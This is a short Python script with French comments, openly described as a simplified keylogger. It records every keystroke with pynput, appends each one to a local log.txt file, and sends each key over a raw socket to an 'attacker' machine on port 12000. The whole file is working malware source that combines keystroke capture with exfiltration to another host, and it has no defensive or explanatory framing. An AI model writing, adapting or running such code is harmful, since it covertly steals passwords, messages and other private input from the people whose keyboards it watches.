# -*- coding: utf-8 -*-

import socket
import os
import time
from pynput.keyboard import Listener

# Envoie la touche pressée à l'attaquant
def sendKeyPressed(key):
    s=socket.socket()
    host = 'LAPTOP-IJ0VCQOM' # remplacer par le nom du PC qui "attaque"
    port=12000
    s.connect((host,port))
    s.send(key.encode())

# Version simplifiée d'un keylogger
def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)
        sendKeyPressed(key)

with Listener(on_press=log_keystroke) as l:
    l.join()